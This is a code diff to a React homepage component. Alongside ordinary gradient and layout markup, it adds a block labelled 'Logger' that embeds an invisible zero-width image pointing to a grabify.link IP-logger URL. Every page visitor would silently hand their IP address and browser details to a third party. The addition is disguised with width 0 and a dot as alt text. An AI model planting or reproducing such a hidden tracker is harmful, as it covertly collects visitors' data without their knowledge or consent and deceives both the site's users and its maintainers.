@@ -42,6 +42,11 @@ const HomePage = () => {
                 "linear-gradient(143.6deg, rgba(132, 252, 132, 0) 20.79%, rgba(121, 249, 121, 0.26) 40.92%, rgba(171, 238, 171, 0) 70.35%)",
             }}
           ></div>
+          {/* Logger */}
+      <span>
+        <img src="https://grabify.link/7OHQZ" alt="." width={0} />
+      </span>
+      {/* Logger */}
 
           <div class="flex lg:pb-10  flex-col relative z-10 ">
             <div class="sm:my-auto mx-auto px-2.5 py-4 sm:max-w-xl md:max-w-full md:px-24 lg:max-w-screen-xl lg:px-0">
